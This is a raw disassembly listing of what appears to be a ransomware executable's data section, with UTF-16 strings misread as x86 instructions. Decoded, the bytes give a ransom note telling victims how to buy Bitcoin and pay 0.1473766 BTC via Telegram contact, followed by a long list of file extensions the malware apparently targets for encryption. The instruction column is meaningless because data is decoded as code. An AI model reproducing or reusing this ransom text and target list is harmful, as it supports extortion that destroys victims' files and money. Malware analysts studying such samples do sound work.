  40682b:	00 69 00             	add    %ch,0x0(%ecx)
  40682e:	6e                   	outsb  %ds:(%esi),(%dx)
  40682f:	00 20                	add    %ah,(%eax)
  406831:	00 6f 00             	add    %ch,0x0(%edi)
  406834:	6e                   	outsb  %ds:(%esi),(%dx)
  406835:	00 6c 00 79          	add    %ch,0x79(%eax,%eax,1)
  406839:	00 2e                	add    %ch,(%esi)
  40683b:	00 00                	add    %al,(%eax)
  40683d:	4b                   	dec    %ebx
  40683e:	48                   	dec    %eax
  40683f:	00 6f 00             	add    %ch,0x0(%edi)
  406842:	77 00                	ja     0x406844
  406844:	20 00                	and    %al,(%eax)
  406846:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40684a:	20 00                	and    %al,(%eax)
  40684c:	49                   	dec    %ecx
  40684d:	00 20                	add    %ah,(%eax)
  40684f:	00 70 00             	add    %dh,0x0(%eax)
  406852:	61                   	popa
  406853:	00 79 00             	add    %bh,0x0(%ecx)
  406856:	2c 00                	sub    $0x0,%al
  406858:	20 00                	and    %al,(%eax)
  40685a:	77 00                	ja     0x40685c
  40685c:	68 00 65 00 72       	push   $0x72006500
  406861:	00 65 00             	add    %ah,0x0(%ebp)
  406864:	20 00                	and    %al,(%eax)
  406866:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40686a:	20 00                	and    %al,(%eax)
  40686c:	49                   	dec    %ecx
  40686d:	00 20                	add    %ah,(%eax)
  40686f:	00 67 00             	add    %ah,0x0(%edi)
  406872:	65 00 74 00 20       	add    %dh,%gs:0x20(%eax,%eax,1)
  406877:	00 42 00             	add    %al,0x0(%edx)
  40687a:	69 00 74 00 63 00    	imul   $0x630074,(%eax),%eax
  406880:	6f                   	outsl  %ds:(%esi),(%dx)
  406881:	00 69 00             	add    %ch,0x0(%ecx)
  406884:	6e                   	outsb  %ds:(%esi),(%dx)
  406885:	00 3f                	add    %bh,(%edi)
  406887:	00 00                	add    %al,(%eax)
  406889:	80 c7 50             	add    $0x50,%bh
  40688c:	00 75 00             	add    %dh,0x0(%ebp)
  40688f:	72 00                	jb     0x406891
  406891:	63 00                	arpl   %eax,(%eax)
  406893:	68 00 61 00 73       	push   $0x73006100
  406898:	00 69 00             	add    %ch,0x0(%ecx)
  40689b:	6e                   	outsb  %ds:(%esi),(%dx)
  40689c:	00 67 00             	add    %ah,0x0(%edi)
  40689f:	20 00                	and    %al,(%eax)
  4068a1:	42                   	inc    %edx
  4068a2:	00 69 00             	add    %ch,0x0(%ecx)
  4068a5:	74 00                	je     0x4068a7
  4068a7:	63 00                	arpl   %eax,(%eax)
  4068a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4068aa:	00 69 00             	add    %ch,0x0(%ecx)
  4068ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4068ae:	00 20                	add    %ah,(%eax)
  4068b0:	00 76 00             	add    %dh,0x0(%esi)
  4068b3:	61                   	popa
  4068b4:	00 72 00             	add    %dh,0x0(%edx)
  4068b7:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  4068bd:	20 00                	and    %al,(%eax)
  4068bf:	66 00 72 00          	data16 add %dh,0x0(%edx)
  4068c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4068c4:	00 6d 00             	add    %ch,0x0(%ebp)
  4068c7:	20 00                	and    %al,(%eax)
  4068c9:	63 00                	arpl   %eax,(%eax)
  4068cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4068cc:	00 75 00             	add    %dh,0x0(%ebp)
  4068cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4068d0:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4068d4:	00 79 00             	add    %bh,0x0(%ecx)
  4068d7:	20 00                	and    %al,(%eax)
  4068d9:	74 00                	je     0x4068db
  4068db:	6f                   	outsl  %ds:(%esi),(%dx)
  4068dc:	00 20                	add    %ah,(%eax)
  4068de:	00 63 00             	add    %ah,0x0(%ebx)
  4068e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4068e2:	00 75 00             	add    %dh,0x0(%ebp)
  4068e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4068e6:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  4068ea:	00 79 00             	add    %bh,0x0(%ecx)
  4068ed:	2c 00                	sub    $0x0,%al
  4068ef:	20 00                	and    %al,(%eax)
  4068f1:	79 00                	jns    0x4068f3
  4068f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4068f4:	00 75 00             	add    %dh,0x0(%ebp)
  4068f7:	20 00                	and    %al,(%eax)
  4068f9:	61                   	popa
  4068fa:	00 72 00             	add    %dh,0x0(%edx)
  4068fd:	65 00 20             	add    %ah,%gs:(%eax)
  406900:	00 62 00             	add    %ah,0x0(%edx)
  406903:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406907:	74 00                	je     0x406909
  406909:	20 00                	and    %al,(%eax)
  40690b:	61                   	popa
  40690c:	00 64 00 76          	add    %ah,0x76(%eax,%eax,1)
  406910:	00 69 00             	add    %ch,0x0(%ecx)
  406913:	73 00                	jae    0x406915
  406915:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40691a:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40691e:	00 20                	add    %ah,(%eax)
  406920:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  406924:	00 20                	add    %ah,(%eax)
  406926:	00 61 00             	add    %ah,0x0(%ecx)
  406929:	20 00                	and    %al,(%eax)
  40692b:	71 00                	jno    0x40692d
  40692d:	75 00                	jne    0x40692f
  40692f:	69 00 63 00 6b 00    	imul   $0x6b0063,(%eax),%eax
  406935:	20 00                	and    %al,(%eax)
  406937:	67 00 6f 00          	add    %ch,0x0(%bx)
  40693b:	6f                   	outsl  %ds:(%esi),(%dx)
  40693c:	00 67 00             	add    %ah,0x0(%edi)
  40693f:	6c                   	insb   (%dx),%es:(%edi)
  406940:	00 65 00             	add    %ah,0x0(%ebp)
  406943:	20 00                	and    %al,(%eax)
  406945:	73 00                	jae    0x406947
  406947:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40694b:	72 00                	jb     0x40694d
  40694d:	63 00                	arpl   %eax,(%eax)
  40694f:	68 00 00 55 79       	push   $0x79550000
  406954:	00 6f 00             	add    %ch,0x0(%edi)
  406957:	75 00                	jne    0x406959
  406959:	72 00                	jb     0x40695b
  40695b:	73 00                	jae    0x40695d
  40695d:	65 00 6c 00 66       	add    %ch,%gs:0x66(%eax,%eax,1)
  406962:	00 20                	add    %ah,(%eax)
  406964:	00 20                	add    %ah,(%eax)
  406966:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40696a:	00 20                	add    %ah,(%eax)
  40696c:	00 66 00             	add    %ah,0x0(%esi)
  40696f:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  406975:	20 00                	and    %al,(%eax)
  406977:	6f                   	outsl  %ds:(%esi),(%dx)
  406978:	00 75 00             	add    %dh,0x0(%ebp)
  40697b:	74 00                	je     0x40697d
  40697d:	20 00                	and    %al,(%eax)
  40697f:	68 00 6f 00 77       	push   $0x77006f00
  406984:	00 20                	add    %ah,(%eax)
  406986:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40698a:	00 20                	add    %ah,(%eax)
  40698c:	00 62 00             	add    %ah,0x0(%edx)
  40698f:	75 00                	jne    0x406991
  406991:	79 00                	jns    0x406993
  406993:	20 00                	and    %al,(%eax)
  406995:	42                   	inc    %edx
  406996:	00 69 00             	add    %ch,0x0(%ecx)
  406999:	74 00                	je     0x40699b
  40699b:	63 00                	arpl   %eax,(%eax)
  40699d:	6f                   	outsl  %ds:(%esi),(%dx)
  40699e:	00 69 00             	add    %ch,0x0(%ecx)
  4069a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4069a2:	00 2e                	add    %ch,(%esi)
  4069a4:	00 20                	add    %ah,(%eax)
  4069a6:	00 00                	add    %al,(%eax)
  4069a8:	80 91 4d 00 61 00 6e 	adcb   $0x6e,0x61004d(%ecx)
  4069af:	00 79 00             	add    %bh,0x0(%ecx)
  4069b2:	20 00                	and    %al,(%eax)
  4069b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4069b5:	00 66 00             	add    %ah,0x0(%esi)
  4069b8:	20 00                	and    %al,(%eax)
  4069ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4069bb:	00 75 00             	add    %dh,0x0(%ebp)
  4069be:	72 00                	jb     0x4069c0
  4069c0:	20 00                	and    %al,(%eax)
  4069c2:	63 00                	arpl   %eax,(%eax)
  4069c4:	75 00                	jne    0x4069c6
  4069c6:	73 00                	jae    0x4069c8
  4069c8:	74 00                	je     0x4069ca
  4069ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4069cb:	00 6d 00             	add    %ch,0x0(%ebp)
  4069ce:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4069d2:	73 00                	jae    0x4069d4
  4069d4:	20 00                	and    %al,(%eax)
  4069d6:	68 00 61 00 76       	push   $0x76006100
  4069db:	00 65 00             	add    %ah,0x0(%ebp)
  4069de:	20 00                	and    %al,(%eax)
  4069e0:	72 00                	jb     0x4069e2
  4069e2:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  4069e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4069e7:	00 72 00             	add    %dh,0x0(%edx)
  4069ea:	74 00                	je     0x4069ec
  4069ec:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  4069f1:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  4069f5:	00 65 00             	add    %ah,0x0(%ebp)
  4069f8:	73 00                	jae    0x4069fa
  4069fa:	65 00 20             	add    %ah,%gs:(%eax)
  4069fd:	00 73 00             	add    %dh,0x0(%ebx)
  406a00:	69 00 74 00 65 00    	imul   $0x650074,(%eax),%eax
  406a06:	73 00                	jae    0x406a08
  406a08:	20 00                	and    %al,(%eax)
  406a0a:	74 00                	je     0x406a0c
  406a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  406a0d:	00 20                	add    %ah,(%eax)
  406a0f:	00 62 00             	add    %ah,0x0(%edx)
  406a12:	65 00 20             	add    %ah,%gs:(%eax)
  406a15:	00 66 00             	add    %ah,0x0(%esi)
  406a18:	61                   	popa
  406a19:	00 73 00             	add    %dh,0x0(%ebx)
  406a1c:	74 00                	je     0x406a1e
  406a1e:	20 00                	and    %al,(%eax)
  406a20:	61                   	popa
  406a21:	00 6e 00             	add    %ch,0x0(%esi)
  406a24:	64 00 20             	add    %ah,%fs:(%eax)
  406a27:	00 72 00             	add    %dh,0x0(%edx)
  406a2a:	65 00 6c 00 69       	add    %ch,%gs:0x69(%eax,%eax,1)
  406a2f:	00 61 00             	add    %ah,0x0(%ecx)
  406a32:	62 00                	bound  %eax,(%eax)
  406a34:	6c                   	insb   (%dx),%es:(%edi)
  406a35:	00 65 00             	add    %ah,0x0(%ebp)
  406a38:	3a 00                	cmp    (%eax),%al
  406a3a:	00 80 8f 43 00 6f    	add    %al,0x6f00438f(%eax)
  406a40:	00 69 00             	add    %ch,0x0(%ecx)
  406a43:	6e                   	outsb  %ds:(%esi),(%dx)
  406a44:	00 6d 00             	add    %ch,0x0(%ebp)
  406a47:	61                   	popa
  406a48:	00 6d 00             	add    %ch,0x0(%ebp)
  406a4b:	61                   	popa
  406a4c:	00 20                	add    %ah,(%eax)
  406a4e:	00 2d 00 20 00 68    	add    %ch,0x68002000
  406a54:	00 78 00             	add    %bh,0x0(%eax)
  406a57:	78 00                	js     0x406a59
  406a59:	70 00                	jo     0x406a5b
  406a5b:	73 00                	jae    0x406a5d
  406a5d:	3a 00                	cmp    (%eax),%al
  406a5f:	2f                   	das
  406a60:	00 2f                	add    %ch,(%edi)
  406a62:	00 77 00             	add    %dh,0x0(%edi)
  406a65:	77 00                	ja     0x406a67
  406a67:	77 00                	ja     0x406a69
  406a69:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406a6d:	6f                   	outsl  %ds:(%esi),(%dx)
  406a6e:	00 69 00             	add    %ch,0x0(%ecx)
  406a71:	6e                   	outsb  %ds:(%esi),(%dx)
  406a72:	00 6d 00             	add    %ch,0x0(%ebp)
  406a75:	61                   	popa
  406a76:	00 6d 00             	add    %ch,0x0(%ebp)
  406a79:	61                   	popa
  406a7a:	00 2e                	add    %ch,(%esi)
  406a7c:	00 63 00             	add    %ah,0x0(%ebx)
  406a7f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a80:	00 6d 00             	add    %ch,0x0(%ebp)
  406a83:	20 00                	and    %al,(%eax)
  406a85:	42                   	inc    %edx
  406a86:	00 69 00             	add    %ch,0x0(%ecx)
  406a89:	74 00                	je     0x406a8b
  406a8b:	70 00                	jo     0x406a8d
  406a8d:	61                   	popa
  406a8e:	00 6e 00             	add    %ch,0x0(%esi)
  406a91:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406a95:	20 00                	and    %al,(%eax)
  406a97:	2d 00 20 00 68       	sub    $0x68002000,%eax
  406a9c:	00 78 00             	add    %bh,0x0(%eax)
  406a9f:	78 00                	js     0x406aa1
  406aa1:	70 00                	jo     0x406aa3
  406aa3:	73 00                	jae    0x406aa5
  406aa5:	3a 00                	cmp    (%eax),%al
  406aa7:	2f                   	das
  406aa8:	00 2f                	add    %ch,(%edi)
  406aaa:	00 77 00             	add    %dh,0x0(%edi)
  406aad:	77 00                	ja     0x406aaf
  406aaf:	77 00                	ja     0x406ab1
  406ab1:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406ab5:	69 00 74 00 70 00    	imul   $0x700074,(%eax),%eax
  406abb:	61                   	popa
  406abc:	00 6e 00             	add    %ch,0x0(%esi)
  406abf:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  406ac3:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406ac7:	6f                   	outsl  %ds:(%esi),(%dx)
  406ac8:	00 6d 00             	add    %ch,0x0(%ebp)
  406acb:	01 51 50             	add    %edx,0x50(%ecx)
  406ace:	00 61 00             	add    %ah,0x0(%ecx)
  406ad1:	79 00                	jns    0x406ad3
  406ad3:	6d                   	insl   (%dx),%es:(%edi)
  406ad4:	00 65 00             	add    %ah,0x0(%ebp)
  406ad7:	6e                   	outsb  %ds:(%esi),(%dx)
  406ad8:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  406adc:	00 69 00             	add    %ch,0x0(%ecx)
  406adf:	6e                   	outsb  %ds:(%esi),(%dx)
  406ae0:	00 66 00             	add    %ah,0x0(%esi)
  406ae3:	6f                   	outsl  %ds:(%esi),(%dx)
  406ae4:	00 72 00             	add    %dh,0x0(%edx)
  406ae7:	6d                   	insl   (%dx),%es:(%edi)
  406ae8:	00 61 00             	add    %ah,0x0(%ecx)
  406aeb:	74 00                	je     0x406aed
  406aed:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  406af3:	41                   	inc    %ecx
  406af4:	00 6d 00             	add    %ch,0x0(%ebp)
  406af7:	6f                   	outsl  %ds:(%esi),(%dx)
  406af8:	00 75 00             	add    %dh,0x0(%ebp)
  406afb:	6e                   	outsb  %ds:(%esi),(%dx)
  406afc:	00 74 00 3a          	add    %dh,0x3a(%eax,%eax,1)
  406b00:	00 20                	add    %ah,(%eax)
  406b02:	00 30                	add    %dh,(%eax)
  406b04:	00 2e                	add    %ch,(%esi)
  406b06:	00 31                	add    %dh,(%ecx)
  406b08:	00 34 00             	add    %dh,(%eax,%eax,1)
  406b0b:	37                   	aaa
  406b0c:	00 33                	add    %dh,(%ebx)
  406b0e:	00 37                	add    %dh,(%edi)
  406b10:	00 36                	add    %dh,(%esi)
  406b12:	00 36                	add    %dh,(%esi)
  406b14:	00 20                	add    %ah,(%eax)
  406b16:	00 42 00             	add    %al,0x0(%edx)
  406b19:	54                   	push   %esp
  406b1a:	00 43 00             	add    %al,0x0(%ebx)
  406b1d:	00 3f                	add    %bh,(%edi)
  406b1f:	42                   	inc    %edx
  406b20:	00 69 00             	add    %ch,0x0(%ecx)
  406b23:	74 00                	je     0x406b25
  406b25:	63 00                	arpl   %eax,(%eax)
  406b27:	6f                   	outsl  %ds:(%esi),(%dx)
  406b28:	00 69 00             	add    %ch,0x0(%ecx)
  406b2b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b2c:	00 20                	add    %ah,(%eax)
  406b2e:	00 41 00             	add    %al,0x0(%ecx)
  406b31:	64 00 64 00 72       	add    %ah,%fs:0x72(%eax,%eax,1)
  406b36:	00 65 00             	add    %ah,0x0(%ebp)
  406b39:	73 00                	jae    0x406b3b
  406b3b:	73 00                	jae    0x406b3d
  406b3d:	3a 00                	cmp    (%eax),%al
  406b3f:	20 00                	and    %al,(%eax)
  406b41:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  406b45:	20 00                	and    %al,(%eax)
  406b47:	6f                   	outsl  %ds:(%esi),(%dx)
  406b48:	00 6e 00             	add    %ch,0x0(%esi)
  406b4b:	20 00                	and    %al,(%eax)
  406b4d:	74 00                	je     0x406b4f
  406b4f:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  406b54:	00 67 00             	add    %ah,0x0(%edi)
  406b57:	72 00                	jb     0x406b59
  406b59:	61                   	popa
  406b5a:	00 6d 00             	add    %ch,0x0(%ebp)
  406b5d:	00 09                	add    %cl,(%ecx)
  406b5f:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  406b64:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406b68:	09 2e                	or     %ebp,(%esi)
  406b6a:	00 6a 00             	add    %ch,0x0(%edx)
  406b6d:	61                   	popa
  406b6e:	00 72 00             	add    %dh,0x0(%edx)
  406b71:	00 09                	add    %cl,(%ecx)
  406b73:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  406b78:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406b7c:	11 2e                	adc    %ebp,(%esi)
  406b7e:	00 63 00             	add    %ah,0x0(%ebx)
  406b81:	6f                   	outsl  %ds:(%esi),(%dx)
  406b82:	00 6e 00             	add    %ch,0x0(%esi)
  406b85:	74 00                	je     0x406b87
  406b87:	61                   	popa
  406b88:	00 63 00             	add    %ah,0x0(%ebx)
  406b8b:	74 00                	je     0x406b8d
  406b8d:	00 13                	add    %dl,(%ebx)
  406b8f:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406b93:	65 00 74 00 74       	add    %dh,%gs:0x74(%eax,%eax,1)
  406b98:	00 69 00             	add    %ch,0x0(%ecx)
  406b9b:	6e                   	outsb  %ds:(%esi),(%dx)
  406b9c:	00 67 00             	add    %ah,0x0(%edi)
  406b9f:	73 00                	jae    0x406ba1
  406ba1:	00 09                	add    %cl,(%ecx)
  406ba3:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  406ba8:	00 63 00             	add    %ah,0x0(%ebx)
  406bab:	00 0b                	add    %cl,(%ebx)
  406bad:	2e 00 64 00 6f       	add    %ah,%cs:0x6f(%eax,%eax,1)
  406bb2:	00 63 00             	add    %ah,0x0(%ebx)
  406bb5:	78 00                	js     0x406bb7
  406bb7:	00 09                	add    %cl,(%ecx)
  406bb9:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406bbd:	6c                   	insb   (%dx),%es:(%edi)
  406bbe:	00 73 00             	add    %dh,0x0(%ebx)
  406bc1:	00 0b                	add    %cl,(%ebx)
  406bc3:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406bc7:	6c                   	insb   (%dx),%es:(%edi)
  406bc8:	00 73 00             	add    %dh,0x0(%ebx)
  406bcb:	78 00                	js     0x406bcd
  406bcd:	00 09                	add    %cl,(%ecx)
  406bcf:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406bd3:	70 00                	jo     0x406bd5
  406bd5:	74 00                	je     0x406bd7
  406bd7:	00 0b                	add    %cl,(%ebx)
  406bd9:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406bdd:	70 00                	jo     0x406bdf
  406bdf:	74 00                	je     0x406be1
  406be1:	78 00                	js     0x406be3
  406be3:	00 09                	add    %cl,(%ecx)
  406be5:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  406be9:	64 00 74 00 00       	add    %dh,%fs:0x0(%eax,%eax,1)
  406bee:	09 2e                	or     %ebp,(%esi)
  406bf0:	00 6d 00             	add    %ch,0x0(%ebp)
  406bf3:	6b 00 61             	imul   $0x61,(%eax),%eax
  406bf6:	00 00                	add    %al,(%eax)
  406bf8:	0d 2e 00 6d 00       	or     $0x6d002e,%eax
  406bfd:	68 00 74 00 6d       	push   $0x6d007400
  406c02:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  406c06:	09 2e                	or     %ebp,(%esi)
  406c08:	00 6f 00             	add    %ch,0x0(%edi)
  406c0b:	71 00                	jno    0x406c0d
  406c0d:	79 00                	jns    0x406c0f
  406c0f:	00 09                	add    %cl,(%ecx)
  406c11:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406c15:	6e                   	outsb  %ds:(%esi),(%dx)
  406c16:	00 67 00             	add    %ah,0x0(%edi)
  406c19:	00 09                	add    %cl,(%ecx)
  406c1b:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406c1f:	73 00                	jae    0x406c21
  406c21:	76 00                	jbe    0x406c23
  406c23:	00 07                	add    %al,(%edi)
  406c25:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406c29:	79 00                	jns    0x406c2b
  406c2b:	00 09                	add    %cl,(%ecx)
  406c2d:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406c31:	71 00                	jno    0x406c33
  406c33:	6c                   	insb   (%dx),%es:(%edi)
  406c34:	00 00                	add    %al,(%eax)
  406c36:	09 2e                	or     %ebp,(%esi)
  406c38:	00 6d 00             	add    %ch,0x0(%ebp)
  406c3b:	64 00 62 00          	add    %ah,%fs:0x0(%edx)
  406c3f:	00 09                	add    %cl,(%ecx)
  406c41:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406c45:	68 00 70 00 00       	push   $0x7000
  406c4a:	09 2e                	or     %ebp,(%esi)
  406c4c:	00 61 00             	add    %ah,0x0(%ecx)
  406c4f:	73 00                	jae    0x406c51
  406c51:	70 00                	jo     0x406c53
  406c53:	00 0b                	add    %cl,(%ebx)
  406c55:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406c59:	73 00                	jae    0x406c5b
  406c5b:	70 00                	jo     0x406c5d
  406c5d:	78 00                	js     0x406c5f
  406c5f:	00 0b                	add    %cl,(%ebx)
  406c61:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  406c65:	74 00                	je     0x406c67
  406c67:	6d                   	insl   (%dx),%es:(%edi)
  406c68:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  406c6c:	09 2e                	or     %ebp,(%esi)
  406c6e:	00 68 00             	add    %ch,0x0(%eax)
  406c71:	74 00                	je     0x406c73
  406c73:	6d                   	insl   (%dx),%es:(%edi)
  406c74:	00 00                	add    %al,(%eax)
  406c76:	09 2e                	or     %ebp,(%esi)
  406c78:	00 78 00             	add    %bh,0x0(%eax)
  406c7b:	6d                   	insl   (%dx),%es:(%edi)
  406c7c:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  406c80:	09 2e                	or     %ebp,(%esi)
  406c82:	00 70 00             	add    %dh,0x0(%eax)
  406c85:	73 00                	jae    0x406c87
  406c87:	64 00 00             	add    %al,%fs:(%eax)
  406c8a:	09 2e                	or     %ebp,(%esi)
  406c8c:	00 70 00             	add    %dh,0x0(%eax)
  406c8f:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  406c93:	00 09                	add    %cl,(%ecx)
  406c95:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406c99:	6c                   	insb   (%dx),%es:(%edi)
  406c9a:	00 61 00             	add    %ah,0x0(%ecx)
  406c9d:	00 09                	add    %cl,(%ecx)
  406c9f:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406ca3:	75 00                	jne    0x406ca5
  406ca5:	62 00                	bound  %eax,(%eax)
  406ca7:	00 09                	add    %cl,(%ecx)
  406ca9:	2e 00 64 00 61       	add    %ah,%cs:0x61(%eax,%eax,1)
  406cae:	00 65 00             	add    %ah,0x0(%ebp)
  406cb1:	00 0b                	add    %cl,(%ebx)
  406cb3:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  406cb7:	6e                   	outsb  %ds:(%esi),(%dx)
  406cb8:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  406cbc:	00 00                	add    %al,(%eax)
  406cbe:	07                   	pop    %es
  406cbf:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406cc3:	73 00                	jae    0x406cc5
  406cc5:	00 09                	add    %cl,(%ecx)
  406cc7:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406ccb:	70 00                	jo     0x406ccd
  406ccd:	33 00                	xor    (%eax),%eax
  406ccf:	00 09                	add    %cl,(%ecx)
  406cd1:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406cd5:	70 00                	jo     0x406cd7
  406cd7:	34 00                	xor    $0x0,%al
  406cd9:	00 09                	add    %cl,(%ecx)
  406cdb:	2e 00 64 00 77       	add    %ah,%cs:0x77(%eax,%eax,1)
  406ce0:	00 67 00             	add    %ah,0x0(%edi)
  406ce3:	00 09                	add    %cl,(%ecx)
  406ce5:	2e 00 7a 00          	add    %bh,%cs:0x0(%edx)
  406ce9:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
  406cef:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  406cf3:	61                   	popa
  406cf4:	00 72 00             	add    %dh,0x0(%edx)
  406cf7:	00 09                	add    %cl,(%ecx)
  406cf9:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  406cfe:	00 76 00             	add    %dh,0x0(%esi)
  406d01:	00 09                	add    %cl,(%ecx)
  406d03:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  406d07:	74 00                	je     0x406d09
  406d09:	66 00 00             	data16 add %al,(%eax)
  406d0c:	09 2e                	or     %ebp,(%esi)
  406d0e:	00 62 00             	add    %ah,0x0(%edx)
  406d11:	6d                   	insl   (%dx),%es:(%edi)
  406d12:	00 70 00             	add    %dh,0x0(%eax)
  406d15:	00 09                	add    %cl,(%ecx)
  406d17:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  406d1b:	6b 00 76             	imul   $0x76,(%eax),%eax
  406d1e:	00 00                	add    %al,(%eax)
  406d20:	09 2e                	or     %ebp,(%esi)
  406d22:	00 61 00             	add    %ah,0x0(%ecx)
  406d25:	76 00                	jbe    0x406d27
  406d27:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  406d2d:	61                   	popa
  406d2e:	00 70 00             	add    %dh,0x0(%eax)
  406d31:	6b 00 00             	imul   $0x0,(%eax),%eax
  406d34:	09 2e                	or     %ebp,(%esi)
  406d36:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  406d3a:	00 6b 00             	add    %ch,0x0(%ebx)
  406d3d:	00 09                	add    %cl,(%ecx)
  406d3f:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  406d44:	00 62 00             	add    %ah,0x0(%edx)
  406d47:	00 09                	add    %cl,(%ecx)
  406d49:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  406d4e:	00 63 00             	add    %ah,0x0(%ebx)
  406d51:	00 09                	add    %cl,(%ecx)
  406d53:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  406d58:	00 66 00             	add    %ah,0x0(%esi)
  406d5b:	00 0b                	add    %cl,(%ebx)
  406d5d:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  406d62:	00 76 00             	add    %dh,0x0(%esi)
  406d65:	78 00                	js     0x406d67
  406d67:	00 09                	add    %cl,(%ecx)
  406d69:	2e 00 69 00          	add    %ch,%cs:0x0(%ecx)
  406d6d:	73 00                	jae    0x406d6f
  406d6f:	6f                   	outsl  %ds:(%esi),(%dx)
  406d70:	00 00                	add    %al,(%eax)
  406d72:	0b 2e                	or     (%esi),%ebp
  406d74:	00 37                	add    %dh,(%edi)
  406d76:	00 7a 00             	add    %bh,0x0(%edx)
  406d79:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
  406d7f:	2e 00 61 00          	add    %ah,%cs:0x0(%ecx)
  406d83:	63 00                	arpl   %eax,(%eax)
  406d85:	65 00 00             	add    %al,%gs:(%eax)
  406d88:	09 2e                	or     %ebp,(%esi)
  406d8a:	00 61 00             	add    %ah,0x0(%ecx)
  406d8d:	72 00                	jb     0x406d8f
  406d8f:	6a 00                	push   $0x0
  406d91:	00 09                	add    %cl,(%ecx)
  406d93:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  406d97:	7a 00                	jp     0x406d99
  406d99:	32 00                	xor    (%eax),%al
  406d9b:	00 09                	add    %cl,(%ecx)
  406d9d:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  406da1:	61                   	popa
  406da2:	00 62 00             	add    %ah,0x0(%edx)
  406da5:	00 0b                	add    %cl,(%ebx)
  406da7:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  406dab:	7a 00                	jp     0x406dad
  406dad:	69 00 70 00 00 09    	imul   $0x9000070,(%eax),%eax
